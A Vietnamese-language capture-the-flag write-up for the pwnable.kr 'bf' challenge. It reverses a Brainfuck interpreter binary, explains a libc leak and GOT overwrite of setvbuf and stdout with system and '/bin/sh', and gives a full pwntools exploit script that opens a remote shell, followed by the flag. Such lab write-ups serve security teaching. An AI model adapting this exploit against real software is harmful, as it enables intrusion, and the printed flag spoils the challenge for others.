# BrainFuck

## Reverse file
Xem thông tin cơ bản của file bf

```sh
thang@DESKTOP-V2RPTL6:/mnt/c/Users/n18dc/OneDrive/Desktop/pwnable.kr/bf$ file bf
bf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=190d45832c271de25448cefe52fbd15ea9ed5e65, not stripped
```

Xem các cơ chế bảo mật của file
```sh
thang@DESKTOP-V2RPTL6:/mnt/c/Users/n18dc/OneDrive/Desktop/pwnable.kr/bf$ checksec bf
[*] '/mnt/c/Users/n18dc/OneDrive/Desktop/pwnable.kr/bf/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Reverse pseudo code từ IDA nhận thấy hàm main của chương trình nhập 1 lần vào biến S, chạy vòng lặp từ 0 -> bé hơn strlen(S), và thực thi do_brainfuck[S[i]]:
```sh
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t i; // [esp+28h] [ebp-40Ch]
  char s[1024]; // [esp+2Ch] [ebp-408h] BYREF
  unsigned int v6; // [esp+42Ch] [ebp-8h]

  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(s, 0, sizeof(s));
  fgets(s, 1024, stdin);
  for ( i = 0; i < strlen(s); ++i )
    do_brainfuck(s[i]);
  return 0;
}
```

Đây là hàm do_brainfuck với các case tương ứng:
```sh
* '+' : tăng giá trị bên trong con trỏ p đang trỏ tới.
* ',' : nhập 1 kí tự
* '-' : giảm giá trị bên trong con trỏ p đang trỏ tới.
* '.' : in ra 1 ký tự đang trỏ tới bởi p.
* '<' : giảm địa chỉ con trỏ p xuống 1 byte.
* '>' : tăng địa chỉ con trỏ p lên 1 byte.
* '[' : thực thi lệnh puts
```

```sh
int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1 - 43;
  switch ( a1 )
  {
    case '+':
      result = p;
      ++*(_BYTE *)p;
      break;
    case ',':
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case '-':
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(char *)p);
      break;
    case '<':
      result = --p;
      break;
    case '>':
      result = ++p;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

## Exploit

#### Các bước thực hiện
* leak libc, tính base, system, binsh
* getshell 

Do có thể di dời con trỏ p, nhập và in được 1 byte nên sẽ leak được libc bằng các ký tự `.>.>.>.`

Overwrite GOT setvbuf và stdout thành system và /bin/sh tương ứng bằng các ký tự `,>,>,>,`

Payload
```sh
from pwn import *
import time
# s = process("./bf")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
s = remote("pwnable.kr", 9001)
libc= ELF("./libc2.so")
pause()
RET = 0x08048416
PLT_PUTS = 0x8048470
GOT_FGETS = 0x804a010
MAIN = 0x8048671
LEAVE_RET = 0x08048549
ADD_ESP_24 = 0x804866b

#leak libc

payload ="<"*0x90 + ".>.>.>. >>>>>,>,>,>,>" + ">"*10 +">>,>,>,>,>" + ">"*0x34 + ',>,>,>,['

s.recv()
# s.recvuntil("type some brainfuck instructions except [ ]\n")
s.sendline(payload)
time.sleep(4)
FGETS = u32(s.recv(4).ljust(4,'\x00'))

libc.address = FGETS - libc.symbols['fgets']

# one_gadget = libc.address + ONE_GG
binsh  = next(libc.search("/bin/sh"))
system = libc.symbols['system']

print "fgets > " + hex(FGETS)
print "libc >> " + hex(libc.address)
print "system >> " + hex(system)
print "binsh >> " + hex(binsh)
# print "one >> " + hex(one_gadget)
s.send(p32(MAIN))
s.send(p32(system))
s.send(p32(binsh))
s.interactive()

```
# Flag = `BrainFuck? what a weird language..`